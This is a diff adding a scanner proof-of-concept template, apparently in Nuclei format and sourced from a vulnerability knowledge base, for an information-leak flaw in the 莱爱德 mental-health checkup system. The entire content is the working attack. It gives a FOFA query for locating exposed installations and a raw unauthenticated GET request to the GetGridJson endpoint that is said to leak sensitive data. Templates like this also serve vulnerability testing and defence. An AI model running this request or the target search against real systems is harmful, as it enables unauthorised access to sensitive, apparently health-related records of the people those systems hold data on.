@@ -1,0 +1,27 @@
+id: poc-kcogcw577algid9l
+info:
+  name: 莱爱德心理健康体检系统GetGridJson存在敏感信息泄露漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/kcogcw577algid9l'
+  tags: info-leak,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: kcogcw577algid9l
+    fofa: body="Ko_login_error"|| body="top.location.href = \"/Login/Index\""
+http:
+- raw:
+  - 'GET /DataSyncManage/DataSync/GetGridJson HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+
+    Accept: application/json, text/javascript, */*; q=0.01
+
+    X-Requested-With: XMLHttpRequest'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
